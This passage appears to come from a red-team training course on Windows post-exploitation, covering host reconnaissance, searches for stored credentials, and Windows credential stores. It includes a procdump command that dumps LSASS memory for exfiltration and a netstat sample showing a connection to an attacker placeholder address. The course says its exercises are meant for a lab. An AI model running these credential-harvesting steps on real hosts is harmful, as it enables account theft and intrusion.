entirely.\r\n\r\nPost-exploitation *starts* after successful exploitation and often overlaps heavily with Installation, C2, and especially **Actions on Objective**. Our focus in this module is the *very first step* within Actions on Objective on a new host: **understanding the host itself**.\r\n\r\n### **1.2 Understanding the Post-Exploitation Mindset and Goals**\r\n\r\nYou've got a shell. Great! But what can you *do* from here? Your immediate goals on this initial host are typically:\r\n\r\n*   **Confirm your access level:** Are you a standard user, an administrator, SYSTEM? This dictates what you can do next.\r\n*   **Understand the host's role:** Is it a workstation, a server, a domain controller? Is it critical infrastructure?\r\n*   **Identify potential avenues for Privilege Escalation (PE):** If you're a low-privileged user, you *must* find a way to get higher privileges (Administrator/SYSTEM) to do anything significant.\r\n*   **Identify potential avenues for Lateral Movement (LM):** This host is just one point. Where else can you go from here? What other machines does it connect to? What credentials are on this machine that might work elsewhere?\r\n*   **Locate valuable data:** Are there sensitive files, configuration settings, or cached credentials lying around?\r\n*   **Gather intelligence about the environment:** Is this host domain-joined? What domain? Who uses this machine? What software is installed?\r\n*   **Prepare for Persistence:** How can you ensure you regain access if your current shell dies or the machine reboots? (We'll touch on this briefly, but persistence is a deeper topic later).\r\n*   **Maintain Operational Security (OpSec):** How can you do all of this without getting caught? (Crucial, and we'll weave this throughout).\r\n\r\nInitial reconnaissance is about answering these questions using the resources immediately at your disposal.\r\n\r\n### **1.3 Establishing and Maintaining a Stable Foothold (Briefly)**\r\n\r\nAs mentioned, we're assuming initial access is achieved. However, it's worth noting that a stable connection is paramount. A wobbly shell that dies every few minutes is useless. Red teamers use various tools (like Cobalt Strike, Covenant, Metasploit, Empire, etc.) to manage agents or implants that provide reliable command and control.\r\n\r\nFor our lab purposes, you might be using RDP, a simple Netcat shell, or a Metasploit session. Just ensure you have a consistent way to run commands on the target machine.\r\n\r\n### **1.4 Essential Windows Command-Line Interface (CMD) and PowerShell Usage for Reconnaissance**\r\n\r\nWindows offers two primary command-line environments:\r\n\r\n1.  **CMD (`cmd.exe`):** The classic command prompt. It's older, simpler, and command-based. Many fundamental network and system commands are executed here. It's universally available on all Windows versions.\r\n2.  **PowerShell (`powershell.exe`):** A more modern, object-oriented scripting environment. It's significantly more powerful, allows for much deeper interaction with the operating system, WMI, and Active Directory, and is essential for modern Windows offensive operations. It's standard on Windows 7+ and Server 2008 R2+.\r\n\r\n**Why use both?**\r\n\r\n*   CMD commands are sometimes quicker for simple tasks (`ipconfig`, `whoami`).\r\n*   PowerShell is indispensable for complex queries, automation, and interacting with system objects (`Get-Process`, `Get-Service`, WMI queries, AD module).\r\n*   Sometimes defenders monitor one more heavily than the other. Using both can sometimes help stay under the radar, or reveal different types of information.\r\n\r\nFor this module, we'll primarily use PowerShell where available, as it provides richer, more structured data, but we'll cover essential CMD commands too.\r\n\r\n**Getting Started in the Lab:**\r\n\r\nAssume you have a shell (e.g., a Metasploit session, a Netcat listener catching a reverse shell, or an RDP connection). You'll interact with the command line through this session.\r\n\r\n### **1.5 Gathering System Information**\r\n\r\nFirst things first, what kind of machine are we on?\r\n\r\n#### **Using `systeminfo` (CMD)**\r\n\r\nThis command provides a wealth of information about the system configuration.\r\n\r\n```cmd\r\nsysteminfo\r\n```\r\n\r\n**What to look for in the output:**\r\n\r\n*   **OS Name:** (e.g., Microsoft Windows 10 Enterprise, Microsoft Windows Server 2019 Standard) - Tells you the operating system.\r\n*   **OS Version:** (e.g., 10.0.19044 N/A Build 19044) - Specific build number. Useful for identifying known OS vulnerabilities.\r\n*   **OS Configuration:** (e.g., Member Workstation, Standalone Server, Domain Controller) - *Crucial*! Tells you if it's part of a domain and its role.\r\n*   **Registered Owner/Organization:** Sometimes reveals internal naming conventions.\r\n*   **Product ID:** Can sometimes indicate the type of license/install.\r\n*   **Original Install Date:** How old is this system?\r\n*   **System Boot Time:** How long has it been running? (Might indicate recent reboots/patching).\r\n*   **System Manufacturer/Model:** Hardware details.\r\n*   **System Type:** (e.g., x64-based PC) - Architecture (32-bit or 64-bit). Important for payload compatibility.\r\n*   **Domain:** If domain-joined, shows the domain name. **Very important!**\r\n*   **Logon Server:** The DC that authenticated the current user. Useful AD info.\r\n*   **Hotfix(s):** Lists installed patches. Can reveal if specific security patches are missing.\r\n*   **Network Card(s):** Basic info about network interfaces.\r\n\r\n**Example Output Snippet:**\r\n\r\n```\r\nHost Name:                 TARGET-PC\r\nOS Name:                   Microsoft Windows 10 Enterprise\r\nOS Version:                10.0.19044 N/A Build 19044\r\nOS Manufacturer:           Microsoft Corporation\r\nOS Configuration:          Member Workstation\r\nOS Build Type:             Multiprocessor Free\r\nRegistered Owner:          User\r\nRegistered Organization:   LAB\r\nProduct ID:                00000-00000-00000-AA000\r\nOriginal Install Date:     7/15/2023, 11:30:00 AM\r\nSystem Boot Time:          7/15/2023, 2:00:00 PM\r\nSystem Manufacturer:       VMware, Inc.\r\nSystem Model:              VMware Virtual Platform\r\nSystem Type:               x64-based PC\r\nProcessor(s):              1 Processor(s) Installed.\r\n                           [01]: Intel64 Family 6 Model 158 Stepping 9 GenuineIntel ~2592 Mhz\r\nBIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1907100924, 7/10/2019\r\nWindows Directory:         C:\\WINDOWS\r\nSystem Directory:          C:\\WINDOWS\\system32\r\nBoot Device:               \\Device\\HarddiskVolume1\r\nSystem Locale:             en-us;English (United States)\r\nInput Locale:              en-us;English (United States)\r\nTime Zone:                 (UTC-05:00) Eastern Time (US & Canada)\r\nTotal Physical Memory:     4,095 MB\r\nAvailable Physical Memory: 2,500 MB\r\nVirtual Memory: Max Size:  8,191 MB\r\nVirtual Memory: Available: 6,300 MB\r\nVirtual Memory: In Use:    1,891 MB\r\nPage File Location(s):     C:\\pagefile.sys\r\nDomain:                    LAB.LOCAL\r\nLogon Server:              \\\\DC01.LAB.LOCAL\r\nHotfix(s):                 8 Hotfix(s) Installed.\r\n                           [01]: KB456xxxxx\r\n                           [02]: KB457xxxxx\r\n                           ...\r\nNetwork Card(s):           1 Card(s) Installed.\r\n                           [01]: Intel(R) 82574L Gigabit Network Connection\r\n                                 Connection Name: Ethernet0\r\n                                 DHCP Enabled:    Yes\r\n                                 IP address(es)\r\n                                 [01]: 192.168.1.150\r\n```\r\n\r\n#### **Using Registry Queries**\r\n\r\nThe Windows Registry is a central database for configuration. You can extract OS version information directly from here.\r\n\r\n```cmd\r\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v ProductName\r\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentBuild\r\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentMajorVersionNumber\r\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentMinorVersionNumber\r\n```\r\n\r\n**Explanation:**\r\n\r\n*   `reg query`: The command to query the registry.\r\n*   `\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\"`: The key path containing OS version info.\r\n*   `/v ProductName`: Specifies the value name (e.g., \"Windows 10 Enterprise\").\r\n*   `/v CurrentBuild`: Specifies the build number (e.g., \"19044\").\r\n*   `/v CurrentMajorVersionNumber`, `/v CurrentMinorVersionNumber`: More specific version numbers.\r\n\r\n**Why use Registry?** It's another way to get the info, sometimes useful if `systeminfo` is blocked or for scripting. It also introduces interacting with the registry, which is vital for other post-exploitation tasks (like persistence).\r\n\r\n### **1.6 Enumerating Users, Groups, and Sessions**\r\n\r\nWho uses this machine? What are their privileges? Who is currently logged in?\r\n\r\n#### **Using `whoami` (CMD)**\r\n\r\nSimple, but essential first step. Tells you the user and domain/hostname you are currently operating as.\r\n\r\n```cmd\r\nwhoami\r\n```\r\n\r\n**Output:**\r\n\r\n```\r\nlab\\user1\r\n```\r\nor\r\n```\r\ntarget-pc\\administrator\r\n```\r\n\r\nThis immediately tells you if you are a local user or a domain user, and your username.\r\n\r\n#### **Using `query user` (CMD)**\r\n\r\nLists users currently logged into the system (primarily via RDP or console session).\r\n\r\n```cmd\r\nquery user\r\n```\r\n\r\n**Output Example:**\r\n\r\n```\r\n USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME\r\n>user1                 rdp-tcp#0           0  Active          3  7/15/2023 2:05 PM\r\n administrator         console             1  Active         none  7/15/2023 1:55 PM\r\n```\r\n\r\n**What to look for:**\r\n\r\n*   **USERNAME:** Other users logged in. Are any of them administrators? Domain Admins?\r\n*   **SESSIONNAME:** Type of session (console, rdp-tcp).\r\n*   **STATE:** Active, Disconnected. Active sessions might be hijackable later (advanced topic).\r\n*   **IDLE TIME:** How long has the session been idle?\r\n\r\n**Why is this important?** Identifying other active users, especially privileged ones, is a key step for potential credential harvesting or session hijacking (M2, M4).\r\n\r\n#### **Using `net user` (CMD)**\r\n\r\nEnumerates local users on the machine.\r\n\r\n```cmd\r\nnet user\r\n```\r\n\r\n**Output Example:**\r\n\r\n```\r\nUser accounts for \\\\TARGET-PC\r\n\r\n-------------------------------------------------------------------------------\r\nAdministrator           Guest                   user1\r\nWDAGUtilityAccount      DefaultAccount\r\nThe command completed successfully.\r\n```\r\n\r\nTo get details about a specific user:\r\n\r\n```cmd\r\nnet user <username>\r\n```\r\n\r\n**Example:**\r\n\r\n```cmd\r\nnet user administrator\r\n```\r\n\r\n**Output Snippet (for Administrator user):**\r\n\r\n```\r\nUser name                     Administrator\r\nFull Name\r\nComment                       Built-in account for administering the computer/domain\r\n...\r\nAccount active                Yes\r\nAccount expires               Never\r\nPassword last set             7/10/2023 10:00:00 AM\r\nPassword expires              Never\r\nPassword changeable           7/10/2023 10:00:00 AM\r\n...\r\nLocal Group Memberships       *Administrators\r\nGlobal Group memberships      *None\r\n...\r\n```\r\n\r\n**What to look for:**\r\n\r\n*   List of users: Identify potential targets.\r\n*   Details of specific users: When was the password last set? Is the account active? What groups do they belong to? (Local Group Memberships is key here).\r\n\r\n**Why is this important?** You need to know which accounts exist locally. Identifying local administrators is critical for privilege escalation.\r\n\r\n#### **Using `net localgroup` (CMD)**\r\n\r\nEnumerates local groups and their members.\r\n\r\n```cmd\r\nnet localgroup\r\n```\r\n\r\n**Output Example:**\r\n\r\n```\r\nAliases for \\\\TARGET-PC\r\n\r\n-------------------------------------------------------------------------------\r\n*Administrators\r\n*Backup Operators\r\n*Guests\r\n*Remote Desktop Users\r\n*Users\r\n...\r\nThe command completed successfully.\r\n```\r\n\r\nTo see members of a specific group (most importantly, `Administrators`):\r\n\r\n```cmd\r\nnet localgroup administrators\r\n```\r\n\r\n**Output Example:**\r\n\r\n```\r\nAlias name     Administrators\r\nComment        Administrators have complete and unrestricted access to the computer/domain\r\n\r\nMembers\r\n\r\n-------------------------------------------------------------------------------\r\nAdministrator\r\nLAB\\Domain Admins\r\nuser1\r\nThe command completed successfully.\r\n```\r\n\r\n**What to look for:**\r\n\r\n*   Which accounts are members of the `Administrators` group? This is your primary target for local privilege escalation.\r\n*   Which accounts are in `Remote Desktop Users`? They can RDP in.\r\n*   Other interesting groups like `Backup Operators` (can read many files), `Remote Management Users`, etc.\r\n\r\n**Why is this important?** Explicitly identifies which users or groups have administrative privileges on this specific machine. Knowing `LAB\\Domain Admins` is a member of the local `Administrators` group on this workstation is a *huge* finding for lateral movement towards domain dominance.\r\n\r\n#### **Using PowerShell for Users and Groups (More Detail)**\r\n\r\nPowerShell cmdlets often provide more structured and detailed output.\r\n\r\n```powershell\r\nGet-LocalUser\r\nGet-LocalGroup\r\nGet-LocalGroupMember -Group \"Administrators\"\r\n```\r\n\r\nThese cmdlets are available on newer Windows versions (Windows 10, Server 2016+). For older versions or domain users/groups (which we'll cover in Module 5), you'd use WMI or the ActiveDirectory module.\r\n\r\n**Example using `Get-LocalGroupMember`:**\r\n\r\n```powershell\r\nGet-LocalGroupMember -Group \"Administrators\" | Select-Object Name, PrincipalSource\r\n```\r\n\r\n**Output Example:**\r\n\r\n```\r\nName                 PrincipalSource\r\n----                 ---------------\r\nTARGET-PC\\Administrator Local\r\nLAB\\Domain Admins    ActiveDirectory\r\nTARGET-PC\\user1      Local\r\n```\r\n\r\n**Why use PowerShell?** The output is object-based, making it much easier to filter, sort, and export data for scripting and automation. `PrincipalSource` clearly tells you if the member is a local account or a domain account.\r\n\r\n### **1.7 Identifying Running Processes and Services**\r\n\r\nWhat software is running? Are there any security products? Any unusual processes?\r\n\r\n#### **Using `tasklist` (CMD)**\r\n\r\nLists currently running processes.\r\n\r\n```cmd\r\ntasklist\r\n```\r\n\r\n**Output Snippet:**\r\n\r\n```\r\nImage Name                     PID Session Name        Session#    Mem Usage\r\n========================= ======== ================ =========== ============\r\nSystem Idle Process              0 Services                   0         8 KB\r\nSystem                           4 Services                   0       184 KB\r\n...\r\nmsmpeng.exe                   1234 Services                   0     150,000 KB  <-- Windows Defender\r\nSearchIndexer.exe             5678 Services                   0      50,000 KB\r\n...\r\ncmd.exe                       9876 rdp-tcp#0                  0       3,000 KB  <-- Your command prompt!\r\npowershell.exe               10112 rdp-tcp#0                  0     100,000 KB\r\n...\r\n```\r\n\r\nTo see services hosted within processes:\r\n\r\n```cmd\r\ntasklist /svc\r\n```\r\n\r\nTo see process details including the full path:\r\n\r\n```cmd\r\ntasklist /v\r\n```\r\n\r\n**What to look for:**\r\n\r\n*   **Security Software:** Processes like `msmpeng.exe` (Windows Defender), `sophos*.exe`, `McAfee*.exe`, `agent.exe` (endpoint agents). Knowing what security is running helps plan evasion.\r\n*   **Unusual Processes:** Anything with a strange name, running from a weird directory (`C:\\Users\\Public\\temp\\malware.exe`), or consuming excessive resources.\r\n*   **Processes running as SYSTEM:** These are high-privilege processes.\r\n*   **Processes with network connections:** Cross-reference with `netstat` output.\r\n\r\n**Why is this important?** Helps identify security controls, potential targets for injection or manipulation, and reveals what the user or system is actively doing.\r\n\r\n#### **Using `Get-Process` (PowerShell)**\r\n\r\nProvides more detailed information about processes.\r\n\r\n```powershell\r\nGet-Process\r\n```\r\n\r\n**Example:** Get details for a specific process name:\r\n\r\n```powershell\r\nGet-Process -Name \"explorer\"\r\n```\r\n\r\n**Example:** Get processes owned by a specific user (requires admin privileges usually):\r\n\r\n```powershell\r\nGet-Process | Where-Object { $_.Owner -eq \"LAB\\user1\" }\r\n```\r\n\r\n**Example:** Get processes and their full path:\r\n\r\n```powershell\r\nGet-Process | Select-Object ProcessName, Path\r\n```\r\n\r\n**Why use PowerShell?** Object-based output allows for powerful filtering and analysis. You can easily find processes based on owner, path, CPU usage, etc.\r\n\r\n#### **Using `Get-Service` (PowerShell)**\r\n\r\nLists installed services and their status.\r\n\r\n```powershell\r\nGet-Service\r\n```\r\n\r\n**Example:** List only running services:\r\n\r\n```powershell\r\nGet-Service | Where-Object { $_.Status -eq \"Running\" }\r\n```\r\n\r\n**Example:** Get details for a specific service:\r\n\r\n```powershell\r\nGet-Service -Name \"Spooler\" # The Print Spooler service, often targeted\r\n```\r\n\r\n**What to look for:**\r\n\r\n*   **Running Services:** What functionality is enabled?\r\n*   **Disabled Services:** Are any critical security services disabled?\r\n*   **Services running as SYSTEM or specific users:** Potential targets for privilege escalation if misconfigured (covered in M3).\r\n*   **Unusual Service Names:** Could indicate malware or custom applications.\r\n\r\n**Why is this important?** Services are often long-running processes that start at boot. Misconfigured services are a classic privilege escalation vector. Identifying security services helps understand defenses.\r\n\r\n### **1.8 Mapping Network Connections and Configuration**\r\n\r\nHow is this machine connected? What other machines is it talking to?\r\n\r\n#### **Using `ipconfig` (CMD)**\r\n\r\nDisplays current TCP/IP network configuration values.\r\n\r\n```cmd\r\nipconfig /all\r\n```\r\n\r\n**Output Snippet:**\r\n\r\n```\r\nWindows IP Configuration\r\n\r\n   Host Name . . . . . . . . . . . . : TARGET-PC\r\n   Primary Dns Suffix  . . . . . . . : lab.local\r\n   Node Type . . . . . . . . . . . . : Hybrid\r\n   IP Routing Enabled. . . . . . . . : No\r\n   WINS Proxy Enabled. . . . . . . . : No\r\n   DNS Suffix Search List. . . . . . : lab.local\r\n\r\nEthernet adapter Ethernet0:\r\n\r\n   Connection-specific DNS Suffix  . :\r\n   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection\r\n   Physical Address. . . . . . . . . : 00-50-56-XX-YY-ZZ\r\n   DHCP Enabled. . . . . . . . . . . : Yes\r\n   Autoconfiguration Enabled . . . . : Yes\r\n   IPv4 Address. . . . . . . . . . . : 192.168.1.150(Preferred)\r\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\r\n   Lease Obtained. . . . . . . . . . : Monday, July 15, 2023 2:00:00 PM\r\n   Lease Expires . . . . . . . . . . : Tuesday, July 16, 2023 2:00:00 PM\r\n   Default Gateway . . . . . . . . . : 192.168.1.1\r\n   DHCP Server . . . . . . . . . . . : 192.168.1.1\r\n   DNS Servers . . . . . . . . . . . : 192.168.1.10  <-- Often the Domain Controller!\r\n                                       8.8.8.8\r\n   NetBIOS over Tcpip. . . . . . . . : Enabled\r\n```\r\n\r\n**What to look for:**\r\n\r\n*   **IP Address(es):** What network segment are you on? Can you reach other segments?\r\n*   **Subnet Mask:** Helps define the local network.\r\n*   **Default Gateway:** The router. Often the first hop to other networks.\r\n*   **DNS Servers:** **Crucial!** In a domain, the primary DNS server is almost always a Domain Controller. This immediately tells you the IP address of a DC.\r\n*   **Domain Name:** Confirms the domain from `systeminfo`.\r\n\r\n**Why is this important?** Understanding the network configuration is fundamental for planning lateral movement. Identifying the DC via DNS server listing is a primary way to locate domain infrastructure.\r\n\r\n#### **Using `netstat` (CMD)**\r\n\r\nDisplays active TCP connections, ports on which the computer is listening, Ethernet statistics, the IP routing table, and IPv6 statistics.\r\n\r\n```cmd\r\nnetstat -ano\r\n```\r\n\r\n**Explanation of flags:**\r\n\r\n*   `-a`: Displays all active TCP connections and the TCP and UDP ports on which the computer is listening.\r\n*   `-n`: Displays active TCP connections, however, addresses and port numbers are expressed numerically and no attempt is made to determine names. Much faster.\r\n*   `-o`: Displays active TCP connections and includes the process ID (PID) for each connection. This is *very* useful.\r\n\r\n**Output Snippet:**\r\n\r\n```\r\nActive Connections\r\n\r\n  Proto  Local Address          Foreign Address        State           PID\r\n  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       848   <-- RPC Endpoint Mapper\r\n  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4     <-- SMB (File Sharing)\r\n  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1236  <-- RDP\r\n  TCP    192.168.1.150:49870    192.168.1.1:53         ESTABLISHED     1152  <-- DNS query to gateway/DC\r\n  TCP    192.168.1.150:49871    192.168.1.10:389       ESTABLISHED     9988  <-- LDAP query to DC (192.168.1.10)\r\n  TCP    192.168.1.150:49872    192.168.1.200:445      ESTABLISHED     4     <-- SMB connection to another host (192.168.1.200)\r\n  TCP    192.168.1.150:50000    YOUR_ATTACKER_IP:4444"
    },
    {
      "title": "module_2",
      "description": "module_2 Overview",
      "order": 2,
      "content": "Alright, team! Welcome back to the deep dive. Module 1 got our feet wet, establishing a basic foothold and getting our bearings on a target Windows host using native tools. We learned *how* to look around.\r\n\r\nNow, in Module 2, we shift gears. We're not just looking around passively anymore; we're actively searching for the *good stuff*. This means digging deeper into the local system to find valuable information, uncovering potential weaknesses we might exploit later (hello, Module 3!), and, perhaps most importantly, finding those precious credentials that can unlock doors to other systems or higher privileges.\r\n\r\nThis is where the post-exploitation phase really starts to pay dividends. Local enumeration gives us context and potential attack vectors, and credential harvesting often provides the keys to the kingdom, or at least the keys to the next room.\r\n\r\nLet's get our hands dirty!\r\n\r\n---\r\n\r\n**Module 2: Local Enumeration & Credential Harvesting**\r\n\r\n**Module Objective:** Identify valuable local information, uncover potential weaknesses, and extract cached or stored credentials from a compromised Windows host.\r\n\r\nBy the end of this module, you will be able to systematically enumerate a Windows host for sensitive files, installed software, system configurations, and critical credential storage locations. You will understand the *why* behind targeting LSASS and registry hives, and perform practical steps (in a lab!) to extract credentials, setting the stage for privilege escalation and lateral movement.\r\n\r\n---\r\n\r\n### **2.1: The Post-Exploitation Mindset: Digging Deeper**\r\n\r\nIn Module 1, we were like tourists getting off the plane ‚Äì looking at the major landmarks (`systeminfo`, `ipconfig`, `net user`). Now, we're residents exploring the hidden alleys, checking basements, and looking under floorboards.\r\n\r\nOur goals in this deeper phase are:\r\n\r\n1.  **Gain Context:** Understand the *specific* role of this machine. Is it a user workstation? A server? What applications run here? Who uses it?\r\n2.  **Find Local Weaknesses:** Identify misconfigurations or vulnerabilities unique to *this* host that could allow us to elevate privileges locally (more on this in M3).\r\n3.  **Discover Sensitive Data:** Locate files containing passwords, API keys, configuration strings, sensitive documents, etc.\r\n4.  **Harvest Credentials:** Extract cached passwords, hashes, or Kerberos tickets stored in memory or on disk. **This is often the fastest way to move forward.**\r\n\r\nWe'll still rely heavily on our command-line friends (CMD and PowerShell), but we'll also introduce the *types* of specialized tools used by red teamers and attackers (and defenders!) to automate and facilitate these tasks.\r\n\r\n### **2.2: In-Depth Local File System Enumeration**\r\n\r\nThe file system is a treasure trove. Users save things where they shouldn't, applications store configurations insecurely, and scripts might contain hardcoded credentials. Our job is to search intelligently.\r\n\r\n**Why Search the File System?**\r\n\r\n*   **Configuration Files:** Applications (databases, web servers, custom tools) often store connection strings, API keys, or passwords in XML, INI, CONFIG, or TXT files.\r\n*   **Scripts:** PowerShell (.ps1), Batch (.bat, .cmd), Python (.py), etc., scripts might contain hardcoded credentials for automation purposes.\r\n*   **User Profiles:** Desktop, Documents, Downloads, AppData directories often contain cached files, browser history, saved RDP connection files, password manager databases (though hopefully encrypted!), and other sensitive user data.\r\n*   **Application Data:** Specific application folders (e.g., `C:\\Program Files`, `C:\\Program Files (x86)`) might contain configuration files or logs of interest.\r\n*   **Temporary Directories:** Sometimes sensitive data or temporary credential files are left behind in `%TEMP%`.\r\n\r\n**Techniques & Commands:**\r\n\r\nWe'll primarily use PowerShell for its power and flexibility in navigating and searching the file system.\r\n\r\n*   **Basic Directory Listing (Recurse):**\r\n    ```powershell\r\n    Get-ChildItem -Path C:\\Users -Recurse -ErrorAction SilentlyContinue\r\n    ```\r\n    *   `Get-ChildItem`: Equivalent of `dir`.\r\n    *   `-Path C:\\Users`: Specifies where to start. User profiles are critical.\r\n    *   `-Recurse`: Goes into subdirectories. Be aware this can be *very* slow and generate a lot of output on large file systems.\r\n    *   `-ErrorAction SilentlyContinue`: Suppresses errors for paths we don't have permission to access, keeping the output clean.\r\n\r\n*   **Searching for Specific File Extensions:** We can filter the recursive listing for files that commonly store credentials or configuration.\r\n    ```powershell\r\n    Get-ChildItem -Path C:\\ -Recurse -Include *.config,*.xml,*.ini,*.txt,*.ps1,*.bat,*.cmd,*.py,*.kdbx,*.rdp -ErrorAction SilentlyContinue\r\n    ```\r\n    *   `-Include`: Specifies file patterns to include. Note: `-Include` *requires* `-Recurse` and a wildcard (`*`) in the `-Path` if searching the root, but the above is a common way to use it starting from a specific path like `C:\\`. A simpler way is to specify the path more broadly if needed, but the above is generally effective.\r\n\r\n*   **Searching File Contents (Grepping):** Once we find interesting files, or even across many files, we can search their *contents* for keywords. PowerShell's `Select-String` is powerful for this.\r\n    ```powershell\r\n    # Example 1: Search all .txt files in C:\\ for the word \"password\"\r\n    Get-ChildItem -Path C:\\ -Recurse -Filter \"*.txt\" -ErrorAction SilentlyContinue | Select-String \"password\"\r\n\r\n    # Example 2: Search specific config files found earlier for \"credential\" or \"pass\" (case-insensitive)\r\n    Get-ChildItem -Path C:\\Users\\SpecificUser\\AppData\\Roaming\\MyApp\\config.xml, C:\\Program Files\\AnotherApp\\settings.ini | Select-String -Pattern \"credential\", \"pass\" -IgnoreCase\r\n    ```\r\n    *   `Select-String`: Searches for text within files.\r\n    *   `-Pattern`: The keyword(s) to search for.\r\n    *   `-IgnoreCase`: Makes the search case-insensitive.\r\n\r\n*   **Looking for RDP Files:** Users often save RDP connection files with credentials.\r\n    ```powershell\r\n    Get-ChildItem -Path C:\\Users -Recurse -Include *.rdp -ErrorAction SilentlyContinue\r\n    ```\r\n    If found, open the `.rdp` file in a text editor; sometimes credentials (or at least the username) are saved within them.\r\n\r\n*   **Browser History/Saved Passwords:** While direct extraction from running browsers is tricky and depends heavily on the browser version and security, knowing *where* browser profiles are stored is useful. Tools often target these locations.\r\n    *   Chrome: `%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\`\r\n    *   Firefox: `%APPDATA%\\Mozilla\\Firefox\\Profiles\\`\r\n    *   Edge (Chromium): `%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\`\r\n\r\n**Practical Tip:** Start broad (`Get-ChildItem -Recurse`), then filter (`-Include`), then search contents (`Select-String`). Be mindful of the potential volume of data. Target user profile directories first as they are most likely to contain user-specific sensitive data.\r\n\r\n### **2.3: Enumerating Installed Software and Patches**\r\n\r\nKnowing what software is installed helps identify potential vulnerabilities, interesting applications (like password managers, VPN clients, admin tools), and missing security patches.\r\n\r\n**Why Enumerate Software/Patches?**\r\n\r\n*   **Vulnerability Identification:** Older versions of software might have known public exploits (CVEs).\r\n*   **Finding Useful Tools:** Discover applications that might contain credentials (e.g., Putty, WinSCP configuration files), or admin tools that could be leveraged.\r\n*   **Patch Level Assessment:** Missing security patches can indicate system vulnerability, potentially to kernel exploits or other system-level attacks (Module 3!).\r\n\r\n**Techniques & Commands:**\r\n\r\n*   **Using WMIC (Classic but can be slow):**\r\n    ```cmd\r\n    wmic product get name,version\r\n    ```\r\n    *   This queries the Windows Installer provider. It's often slow and can sometimes even trigger re-configuration of installed software. Use with caution.\r\n\r\n*   **Using PowerShell (More Recommended):**\r\n    ```powershell\r\n    # Get list of installed applications (generally faster than WMIC)\r\n    Get-Package\r\n\r\n    # Get list of installed Hotfixes/Patches\r\n    Get-HotFix\r\n    ```\r\n    *   `Get-Package`: Works well on newer Windows versions (Windows 8/Server 2012 R2 and later). Provides name, version, and source.\r\n    *   `Get-HotFix`: Lists installed Windows updates/patches. Compare this list against known critical security updates to identify missing patches.\r\n\r\n**Practical Tip:** Combine `Get-Package` and `Get-HotFix` output with vulnerability databases (like NVD) or security tools (though this course focuses on offensive techniques, awareness of defensive tools helps understand detection) to identify potential software-based attack vectors.\r\n\r\n### **2.4: Understanding Windows Credential Storage Locations**\r\n\r\nThis is the core of credential harvesting. Windows needs to store and manage credentials for users to log in, access resources, and run services. Understanding *where* it stores them is key to knowing *how* to steal them.\r\n\r\nThink of Windows as having several \"vaults\" for credentials:\r\n\r\n1.  **LSASS (Local Security Authority Subsystem Service):**\r\n    *   This is a critical Windows process (`lsass.exe`).\r\n    *   It handles security policy, user authentication, and manages credentials for currently logged-on users and active system processes.\r\n    *   It holds various credential representations in memory:\r\n        *   **Cleartext Passwords:** Sometimes, if certain security policies are enabled or on older systems. *Highly valuable!*\r\n        *   **NTLM Hashes:** Cryptographic hashes of user passwords (specifically, the NTLM hash).\r\n        *   **Kerberos Tickets:** Both Ticket Granting Tickets (TGTs) and Service Tickets (TGSs). These can be reused (Pass-the-Ticket).\r\n        *   **LSA Secrets:** System-level credentials used by services or the machine account.\r\n    *   Accessing LSASS memory requires high privileges (typically Administrator or SYSTEM).\r\n\r\n2.  **SAM and SECURITY Registry Hives:**\r\n    *   These are files located at `C:\\Windows\\System32\\config\\SAM` and `C:\\Windows\\System32\\config\\SECURITY`.\r\n    *   **SAM (Security Account Manager):** Contains the local user accounts database, including their NTLM password hashes. This is for *local* accounts on that specific machine.\r\n    *   **SECURITY:** Contains the LSA Secrets, which can include cached domain controller credentials, service account passwords, and other system-level secrets.\r\n    *   These files are locked while Windows is running normally. To access them, you need SYSTEM privileges and often need to access them *offline* or via a method that bypasses the file lock (like Volume Shadow Copy).\r\n\r\n3.  **Credential Manager:**\r\n    *   This is a user-specific store (`%APPDATA%\\Microsoft\\Credentials` and `%LOCALAPPDATA%\\Microsoft\\Credentials`).\r\n    *   Users can save credentials here for things like:\r\n        *   RDP connections\r\n        *   Network shares\r\n        *   Websites (less common now, browsers handle this)\r\n        *   Specific applications\r\n    *   These credentials are encrypted using the user's login credentials as part of the key derivation. Accessing *another user's* Credential Manager requires SYSTEM privileges to decrypt their data.\r\n\r\n4.  **LSA Secrets (Older/Specific):**\r\n    *   While some LSA Secrets are in the SECURITY hive, some might be accessible differently. These often relate to machine accounts, service accounts, or cached domain credentials.\r\n\r\nUnderstanding these locations tells us *where* our tools need to look and *what privileges* are required for each method.\r\n\r\n### **2.5: Dumping LSASS Process Memory**\r\n\r\nThis is arguably the most common and often most fruitful method for harvesting credentials from a live system.\r\n\r\n**Why Dump LSASS?** Because it holds the most *current* and *active* credential information, including sometimes cleartext passwords or easily reusable hashes/tickets.\r\n\r\n**Requirement:** Administrator or SYSTEM privileges on the target machine.\r\n\r\n**Technique 1: Using `procdump` (Sysinternals)**\r\n\r\n`procdump` is a legitimate Microsoft Sysinternals tool used by developers and administrators to troubleshoot application crashes by creating process dumps. We can repurpose it to dump the memory of `lsass.exe`.\r\n\r\n*   **Step 1: Obtain `procdump`:** Download the Sysinternals suite or just `procdump.exe`. You'll need to get this executable onto the target machine (or run it remotely if you have that capability).\r\n*   **Step 2: Run `procdump` on `lsass.exe`:**\r\n    ```cmd\r\n    procdump.exe -accepteula -ma lsass.exe lsass.dmp\r\n    ```\r\n    *   `-accepteula`: Automatically accepts the End-User License Agreement.\r\n    *   `-ma`: Writes a dump file with all process memory. This is crucial for capturing credentials.\r\n    *   `lsass.exe`: The target process name.\r\n    *   `lsass.dmp`: The output file name for the memory dump.\r\n*   **Step 3: Exfiltrate the dump file:** Copy `lsass.dmp` from the target machine back to your attacker machine.\r\n*   **Step 4: Analyze the dump file:** Use a tool *on your attacker machine* to read the `lsass.dmp` file and extract credentials. The 